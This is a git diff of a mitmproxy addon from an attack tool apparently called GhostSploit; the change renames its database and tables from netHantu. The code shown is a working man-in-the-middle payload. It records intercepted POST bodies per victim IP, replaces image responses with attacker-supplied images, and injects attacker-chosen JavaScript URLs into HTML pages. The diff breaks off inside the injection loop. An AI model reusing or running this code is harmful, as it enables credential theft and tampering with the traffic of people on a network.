@@ -8,54 +8,54 @@ from bs4 import BeautifulSoup
 import sqlite3, time, os, base64
 
 script_path = os.path.dirname(os.path.realpath(__file__)) + "/"
-DBconn = sqlite3.connect(script_path + "netHantu.db")
+DBconn = sqlite3.connect(script_path + "GhostSploit.db")
 DBcursor = DBconn.cursor()
-DBcursor.execute("CREATE TABLE IF NOT EXISTS netHantu_mitm (id integer primary key autoincrement, source TEXT,host TEXT, url TEXT, method TEXT, data TEXT, dns TEXT)")
-DBcursor.execute("CREATE TABLE IF NOT EXISTS netHantu_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
-DBcursor.execute("CREATE TABLE IF NOT EXISTS netHantu_attacks (id integer primary key autoincrement, attackid TEXT, attack_type TEXT, target TEXT)")
-DBcursor.execute("CREATE TABLE IF NOT EXISTS netHantu_js (attackid TEXT, target TEXT, jsurl TEXT)")
+DBcursor.execute("CREATE TABLE IF NOT EXISTS GhostSploit_mitm (id integer primary key autoincrement, source TEXT,host TEXT, url TEXT, method TEXT, data TEXT, dns TEXT)")
+DBcursor.execute("CREATE TABLE IF NOT EXISTS GhostSploit_img (attackid TEXT, target TEXT, img TEXT, targetip TEXT)")
+DBcursor.execute("CREATE TABLE IF NOT EXISTS GhostSploit_attacks (id integer primary key autoincrement, attackid TEXT, attack_type TEXT, target TEXT)")
+DBcursor.execute("CREATE TABLE IF NOT EXISTS GhostSploit_js (attackid TEXT, target TEXT, jsurl TEXT)")
 DBconn.commit()
 DBconn.close()
 
 # source, host, url, method, data, time
 
 def request(flow):
-    DBconn = sqlite3.connect(script_path + "netHantu.db")
+    DBconn = sqlite3.connect(script_path + "GhostSploit.db")
     DBcursor = DBconn.cursor()
-    DBcursor.execute("SELECT attackid FROM netHantu_attacks WHERE target=? AND attack_type='mitm' ORDER BY id DESC LIMIT 1", [str(flow.client_conn.address()[0])])
+    DBcursor.execute("SELECT attackid FROM GhostSploit_attacks WHERE target=? AND attack_type='mitm' ORDER BY id DESC LIMIT 1", [str(flow.client_conn.address()[0])])
     data = DBcursor.fetchone()
     if not data == None:
         if flow.request.method == "POST":
-            DBcursor.execute("INSERT INTO netHantu_mitm(source, host, url, method, data, dns) VALUES (?, ?, ?, ?, ?, ?)", [str(flow.client_conn.address()[0]), str(flow.request.host), str(flow.request.pretty_url), str(flow.request.method), str(flow.request.text), "0"])
+            DBcursor.execute("INSERT INTO GhostSploit_mitm(source, host, url, method, data, dns) VALUES (?, ?, ?, ?, ?, ?)", [str(flow.client_conn.address()[0]), str(flow.request.host), str(flow.request.pretty_url), str(flow.request.method), str(flow.request.text), "0"])
             DBconn.commit()
             print(str(flow.client_conn.address()[0]) + " - " + flow.request.host + " - " + flow.request.pretty_url + " - " + flow.request.method + " - " + str(flow.request.text) + " - " + "0")
         else:
-            DBcursor.execute("INSERT INTO netHantu_mitm(source, host, url, method, data, dns) VALUES (?, ?, ?, ?, ?, ?)", [str(flow.client_conn.address()[0]), str(flow.request.host), str(flow.request.pretty_url), str(flow.request.method), "false", "0"])
+            DBcursor.execute("INSERT INTO GhostSploit_mitm(source, host, url, method, data, dns) VALUES (?, ?, ?, ?, ?, ?)", [str(flow.client_conn.address()[0]), str(flow.request.host), str(flow.request.pretty_url), str(flow.request.method), "false", "0"])
             DBconn.commit()
             print(str(flow.client_conn.address()[0]) + " - " + flow.request.host + " - " + flow.request.pretty_url + " - " + flow.request.method + " - " + "false" + " - " +  "0")
     DBconn.close()
 
 def response(flow):
     if flow.response.headers.get("content-type", "").startswith("image"):
-        DBconn = sqlite3.connect(script_path + "netHantu.db")
+        DBconn = sqlite3.connect(script_path + "GhostSploit.db")
         DBcursor = DBconn.cursor()
-        DBcursor.execute("SELECT img FROM netHantu_img WHERE targetip = ?", [str(flow.client_conn.address()[0])])
+        DBcursor.execute("SELECT img FROM GhostSploit_img WHERE targetip = ?", [str(flow.client_conn.address()[0])])
         data = DBcursor.fetchall()
         if not data == []:
             img = data[0][0]
             img = base64.b64decode(img)
             flow.response.content = img
             flow.response.headers["content-type"] = "image/png"
-    DBconn = sqlite3.connect(script_path + "netHantu.db")
+    DBconn = sqlite3.connect(script_path + "GhostSploit.db")
     DBcursor = DBconn.cursor()
-    DBcursor.execute("SELECT attackid FROM netHantu_attacks WHERE target=? AND attack_type='injectjs' ORDER BY id DESC LIMIT 1", [str(flow.client_conn.address()[0])])
+    DBcursor.execute("SELECT attackid FROM GhostSploit_attacks WHERE target=? AND attack_type='injectjs' ORDER BY id DESC LIMIT 1", [str(flow.client_conn.address()[0])])
     data = DBcursor.fetchone()
     if not data == None:
         if "content-type" in flow.response.headers:
             if flow.response.headers["content-type"][:9] == 'text/html':
                 html = BeautifulSoup(flow.response.get_text(), "lxml")
                 if html.body:
-                    DBcursor.execute("SELECT jsurl FROM netHantu_js WHERE target = ?", [str(flow.client_conn.address()[0])])
+                    DBcursor.execute("SELECT jsurl FROM GhostSploit_js WHERE target = ?", [str(flow.client_conn.address()[0])])
                     data = DBcursor.fetchall()
                     for item in data:
                         jsurl = item[0]
